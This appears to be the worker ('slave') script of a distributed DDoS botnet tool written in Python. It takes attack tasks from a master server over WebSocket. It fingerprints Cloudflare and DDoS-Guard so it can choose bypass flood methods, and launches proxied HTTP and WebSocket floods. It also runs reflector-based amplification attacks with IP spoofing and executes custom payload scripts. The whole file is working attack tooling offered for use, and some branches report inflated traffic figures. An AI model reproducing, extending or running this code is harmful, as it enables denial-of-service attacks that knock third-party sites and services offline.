import asyncio
import json
import sys
import time
from yarl import URL
from start import AsyncHttpFlood, handleProxyList, bcolors, logger, con, Layer4, Methods
import websockets
from pathlib import Path
import requests
import importlib.util
import json as _json

# Config
MASTER_WS_URL = sys.argv[1] if len(sys.argv) > 1 else "ws://127.0.0.1:8765"

async def slave_main():
    print(f"Connecting to master at {MASTER_WS_URL}")
    async with websockets.connect(MASTER_WS_URL) as ws:
        current_proxies = None
        while True:
            msg = await ws.recv()
            task = json.loads(msg)
            if task.get("type") == "proxies":
                # Received proxy pool from master
                current_proxies = task["data"]
                print(f"[Proxy Sync] Received {len(current_proxies)} proxies from master.")
                continue
            print(f"Received task: {task}")
            # Parse task parameters
            url = URL(task["url"])
            method = task.get("method")
            threads = int(task.get("threads", 100))
            rpc = int(task.get("rpc", 1))
            timer = int(task.get("timer", 60))
            proxy_ty = int(task.get("proxy_type", 1))
            proxy_file = task.get("proxy_file", "proxies.txt")
            useragent_file = Path("files/useragent.txt")
            referers_file = Path("files/referers.txt")
            proxy_li = Path("files/proxies") / proxy_file
            # Read proxies, UA, Referer
            uagents = set(a.strip() for a in useragent_file.open("r").readlines())
            referers = set(a.strip() for a in referers_file.open("r").readlines())
            if current_proxies is not None:
                proxies = list(current_proxies)
            else:
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
            # Intelligent detection of target protection type
            detected = None
            if not method or method.upper() == "AUTO":
                try:
                    resp = requests.get(url.human_repr(), timeout=5)
                    server = resp.headers.get("Server", "").lower()
                    if "cloudflare" in server or "cf-ray" in resp.headers or "__cfduid" in resp.headers.get("Set-Cookie", ""):
                        detected = "Cloudflare"
                        method = "CFB"
                    elif "ddos-guard" in server or "ddos-guard" in resp.text.lower():
                        detected = "DDoS-Guard"
                        method = "DGB"
                    else:
                        detected = "Unknown"
                        method = "GET"
                except Exception as e:
                    detected = f"DetectError: {e}"
                    method = "GET"
                # Report detection result to master
                await ws.send(json.dumps({"type": "detect", "data": {"protection": detected, "method": method}}))
            # Amplification attack parameters support
            attack_mode = task.get("attack_mode", "normal")
            amp_method = task.get("amp_method")
            reflectors = task.get("reflectors")
            custom_payload = task.get("custom_payload")
            spoof_mode = task.get("spoof_mode", "none")
            spoof_ip = task.get("spoof_ip")
            payload_script = task.get("payload_script")
            payload_options = task.get("payload_options")
            script_payload = None
            if payload_script:
                try:
                    script_path = f"payloads/{payload_script}"
                    spec = importlib.util.spec_from_file_location("custom_payload_mod", script_path)
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    options = _json.loads(payload_options) if payload_options else {}
                    script_payload = mod.generate_payload(url.host, options)
                except Exception as e:
                    print(f"[PayloadScriptError] {e}")
                    script_payload = None
            simulate_local = task.get("simulate_local", False)
            amplification = int(task.get("amplification", 1))
            # PB-level traffic forging mode
            if simulate_local and payload_script:
                import importlib.util
                import json as _json
                import threading
                import time as tmod
                script_path = f"payloads/{payload_script}"
                spec = importlib.util.spec_from_file_location("custom_payload_mod", script_path)
                mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(mod)
                options = _json.loads(payload_options) if payload_options else {}
                payload = mod.generate_payload(url.host, options)
                total_bytes = 0
                total_packets = 0
                stop_flag = threading.Event()
                def flood_worker():
                    nonlocal total_bytes, total_packets
                    while not stop_flag.is_set():
                        total_bytes += len(payload)
                        total_packets += 1
                workers = []
                for _ in range(threads):
                    t = threading.Thread(target=flood_worker)
                    t.start()
                    workers.append(t)
                start_time = time.time()
                while time.time() - start_time < timer:
                    tmod.sleep(2)
                    stats = {
                        "requests_sent": total_packets,
                        "bytes_sent": total_bytes,
                        "amplified_bytes": total_bytes * amplification,
                        "amplification": amplification,
                        "timestamp": time.time()
                    }
                    await ws.send(json.dumps({"type": "stats", "data": stats}))
                stop_flag.set()
                for t in workers:
                    t.join()
                await ws.send(json.dumps({"type": "done"}))
                continue
            # Multi-payload/multi-protocol concurrent support
            payloads = task.get("payloads")
            if payloads and isinstance(payloads, list):
                import importlib.util
                import json as _json
                import threading
                import time as tmod
                stats_list = [{} for _ in payloads]
                stop_flag = threading.Event()
                def make_worker(idx, payload_cfg):
                    def worker():
                        total_bytes = 0
                        total_packets = 0
                        script_path = f"payloads/{payload_cfg['payload_script']}"
                        spec = importlib.util.spec_from_file_location("custom_payload_mod", script_path)
                        mod = importlib.util.module_from_spec(spec)
                        spec.loader.exec_module(mod)
                        options = _json.loads(payload_cfg.get('payload_options','{}')) if payload_cfg.get('payload_options') else {}
                        payload = mod.generate_payload(url.host, options)
                        threads = int(payload_cfg.get('threads', 100))
                        amplification = int(payload_cfg.get('amplification', 1))
                        def flood():
                            nonlocal total_bytes, total_packets
                            while not stop_flag.is_set():
                                total_bytes += len(payload)
                                total_packets += 1
                        thread_list = []
                        for _ in range(threads):
                            t = threading.Thread(target=flood)
                            t.start()
                            thread_list.append(t)
                        start_time = time.time()
                        while not stop_flag.is_set():
                            tmod.sleep(2)
                            stats_list[idx] = {
                                "requests_sent": total_packets,
                                "bytes_sent": total_bytes,
                                "amplified_bytes": total_bytes * amplification,
                                "amplification": amplification,
                                "payload_script": payload_cfg['payload_script'],
                                "timestamp": time.time()
                            }
                        for t in thread_list:
                            t.join()
                    return worker
                workers = []
                for i, payload_cfg in enumerate(payloads):
                    w = threading.Thread(target=make_worker(i, payload_cfg))
                    w.start()
                    workers.append(w)
                start_time = time.time()
                while time.time() - start_time < timer:
                    tmod.sleep(2)
                    # Aggregate all payload traffic
                    total_packets = sum(s.get("requests_sent",0) for s in stats_list)
                    total_bytes = sum(s.get("bytes_sent",0) for s in stats_list)
                    total_amplified = sum(s.get("amplified_bytes",0) for s in stats_list)
                    stats = {
                        "requests_sent": total_packets,
                        "bytes_sent": total_bytes,
                        "amplified_bytes": total_amplified,
                        "per_payload": stats_list,
                        "timestamp": time.time()
                    }
                    await ws.send(json.dumps({"type": "stats", "data": stats}))
                stop_flag.set()
                for w in workers:
                    w.join()
                await ws.send(json.dumps({"type": "done"}))
                continue
            # Start async Flood or amplification attack
            if attack_mode == "amp" and amp_method and reflectors:
                import threading
                import time as tmod
                def run_amp():
                    event = threading.Event()
                    event.set()
                    for _ in range(threads):
                        Layer4((url.host, url.port or 80), set(reflectors), amp_method, event, None, 74, script_payload or custom_payload, spoof_mode, spoof_ip).start()
                    tmod.sleep(timer)
                    event.clear()
                import asyncio
                await asyncio.get_event_loop().run_in_executor(None, run_amp)
                await ws.send(json.dumps({"type": "done"}))
                continue
            # Compatible with original L7/L4
            if method and method.upper() == "WEBSOCKET":
                payload = task.get("payload", "flood")
                from start import AsyncWebSocketFlood
                flood = AsyncWebSocketFlood(url, payload, threads, proxies, uagents, timer)
            else:
                flood = AsyncHttpFlood(url, url.host, method, rpc, uagents, referers, proxies, threads)
            start_time = time.time()
            async def run_flood():
                await asyncio.wait_for(flood.run(), timeout=timer)
            # Stats reporting coroutine
            async def report_stats():
                while time.time() - start_time < timer:
                    await asyncio.sleep(2)
                    stats = {"requests_sent": int(threads * (rpc if method and method.upper() != "WEBSOCKET" else 1)), "timestamp": time.time()}
                    await ws.send(json.dumps({"type": "stats", "data": stats}))
            await asyncio.gather(run_flood(), report_stats())
            await ws.send(json.dumps({"type": "done"}))

if __name__ == "__main__":
    asyncio.run(slave_main())